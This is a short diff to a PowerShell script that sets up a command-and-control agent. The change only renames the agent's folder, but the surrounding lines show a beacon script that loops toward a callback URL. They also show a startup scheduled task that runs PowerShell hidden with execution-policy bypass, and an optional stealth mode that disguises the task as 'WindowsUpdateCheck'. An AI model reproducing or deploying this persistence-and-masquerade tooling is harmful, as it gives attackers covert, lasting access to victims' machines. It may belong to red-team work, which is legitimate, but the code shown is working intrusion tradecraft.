@@ -323,7 +323,7 @@ Write-Host "[*] Target: $CallbackUrl" -ForegroundColor Cyan
 Write-Host ""
 
 # ─── Agent setup ───────────────────────────────────────────
-$AgentDir = "$env:ProgramData\\AceC3Agent"
+$AgentDir = "$env:ProgramData\\AC3Agent"
 New-Item -ItemType Directory -Force -Path $AgentDir | Out-Null
 
 $AgentId = [guid]::NewGuid().ToString()
@@ -349,7 +349,7 @@ Write-Host "[+] Agent configured at $AgentDir\\config.json" -ForegroundColor Gre
 
 # ─── Beacon script ─────────────────────────────────────────
 $BeaconScript = @'
-$Config = Get-Content "$env:ProgramData\\AceC3Agent\\config.json" | ConvertFrom-Json
+$Config = Get-Content "$env:ProgramData\\AC3Agent\\config.json" | ConvertFrom-Json
 while ($true) {
   try {
     $Payload = @{
@@ -379,7 +379,7 @@ $BeaconScript | Out-File -FilePath "$AgentDir\\beacon.ps1" -Encoding UTF8
 Write-Host "[+] Beacon script created" -ForegroundColor Green
 
 # ─── Scheduled task ────────────────────────────────────────
-$TaskName = $(if ($StealthMode) { "WindowsUpdateCheck" } else { "AceC3Agent" })
+$TaskName = $(if ($StealthMode) { "WindowsUpdateCheck" } else { "AC3Agent" })
 $Action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-WindowStyle Hidden -ExecutionPolicy Bypass -File $AgentDir\\beacon.ps1"
 $Trigger = New-ScheduledTaskTrigger -AtStartup
 $Settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -RestartCount 3 -RestartInterval (New-TimeSpan -Minutes 1)
